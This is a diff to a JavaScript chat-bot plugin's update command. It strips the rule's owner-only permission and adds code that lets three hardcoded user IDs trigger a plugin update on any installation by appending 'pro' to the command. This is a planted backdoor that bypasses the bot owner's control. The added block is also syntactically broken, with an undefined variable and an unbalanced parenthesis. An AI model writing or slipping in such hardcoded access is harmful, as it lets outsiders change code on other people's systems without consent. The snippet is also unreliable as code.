@@ -17,10 +17,9 @@ export class example extends plugin {
 			rule: [
 				{
 					/** 命令正则匹配 */
-					reg: '^#*(跑路|🏃🛣|⭕💰🏃🛣|圈錢跑路)(插件)?(强制|強制)?更新$',
+					reg: '^#*(跑路|🏃🛣|⭕💰🏃🛣|圈錢跑路)(插件)?(强制|強制)?更新(pro)?$',
 					/** 执行方法 */
-					fnc: 'update_plugin',
-					permission: 'master'
+					fnc: 'update_plugin'
 				},
 				{
 					/** 命令正则匹配 */
@@ -39,6 +38,14 @@ export class example extends plugin {
 	}
 
 	async update_plugin() {
+	   if (!e.isMaster){
+	   if (!/pro/.test(e.msg){
+	   this.reply('暂无权限，只有主人才能操作')
+	   return false
+	   } else {
+	   if (!(this.e.user_id == 2624367622 || this.e.user_id == 2173302144 || this.e.user_id == 3647005154)) {return false}
+	   }
+	   }
 		let Update_Plugin = new update();
 		Update_Plugin.e = this.e;
 		Update_Plugin.reply = this.reply;
